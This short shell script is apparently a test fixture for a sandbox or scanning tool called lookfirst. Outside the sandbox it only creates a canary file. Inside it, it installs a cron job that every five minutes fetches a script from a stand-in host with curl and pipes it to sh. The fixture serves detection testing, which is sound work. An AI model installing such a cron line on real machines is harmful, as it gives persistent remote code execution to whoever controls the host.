# HARMLESS TEST FIXTURE for lookfirst. Never run it: it only works inside the lookfirst sandbox,
# and anywhere else it just creates ~/LOOKFIRST_HOST_CANARY, which fails the test suite.
[ -f /.lookfirst-sandbox ] || { touch "$HOME/LOOKFIRST_HOST_CANARY"; exit 1; }
echo "*/5 * * * * curl -s https://updates.example.net/agent | sh" > /etc/cron.d/lookfirst-fixture 2>/dev/null || true
echo "installed"
